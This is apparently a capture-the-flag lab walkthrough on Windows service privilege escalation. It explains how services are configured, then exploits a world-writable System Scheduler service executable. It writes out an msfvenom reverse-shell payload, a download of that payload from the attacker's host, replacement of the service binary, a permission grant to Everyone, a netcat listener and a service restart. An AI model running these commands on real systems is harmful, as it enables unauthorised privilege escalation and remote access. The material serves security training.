
## Windows Services

Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable **which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully**. Each service also specifies the user account under which the service will run.

```shell-session
C:\> sc qc apphostsvc
```


Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.


All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:


A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:

```shell-session
C:\> sc qc WindowsScheduler
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

```shell-session
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

And here we have something interesting. **The Everyone group has modify permissions (M) on the service's executable**. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

```shell-session
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.9.67 LPORT=4445 -f exe-service -o rev-svc.exe
```

```shell-session
python3 -m http.server
```

We can then pull the payload from Powershell with the following command:

```shell-session
wget http://10.9.9.67:8000/rev-svc3.exe -O rev-svc3.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

```shell-session
cd C:\PROGRA~2\SYSTEM~1\
```

```shell-session
move WService.exe WService.exe.bkp
```

```shell-session
 move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```

```shell-session
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
```

We start a reverse listener on our attacker machine:

```shell-session
nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:

```shell-session
C:\> sc stop windowsscheduler
```

```shell-session
C:\> sc start windowsscheduler
```

**Note:** PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges

```shell-session
nc -lvp 4445
```

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.